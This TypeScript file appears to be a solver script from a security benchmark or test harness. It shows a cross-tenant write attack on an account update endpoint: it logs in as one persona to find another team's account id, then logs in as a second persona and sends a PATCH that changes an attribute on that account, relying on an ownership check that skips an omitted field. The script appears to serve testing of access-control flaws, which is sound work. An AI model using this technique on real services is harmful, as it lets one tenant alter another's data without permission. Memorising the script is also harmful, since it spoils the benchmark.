// Cross-team write via the account patch endpoint: discover a team B account id as persona_b, then as
// persona_a patch an attribute on it (the tenant-ownership gate is driven by a request field we omit).
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const listRes = await ctx.fetch(ctx.plan.routes.accountList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ ext_id: string }> }
  const victimId = list.items?.[0]?.ext_id
  if (!victimId) return

  await ctx.login('persona_a')
  const path = ctx.plan.routes.accountUpdate!.path.replace(/:[A-Za-z0-9_]+/, victimId)
  const fieldKey = ctx.plan.params.accountField ?? 'field'
  const body: Record<string, string> = { value: 'reassigned-by-ops' }
  body[fieldKey] = 'tier'
  await ctx.fetch(path, {
    method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body),
  })
}
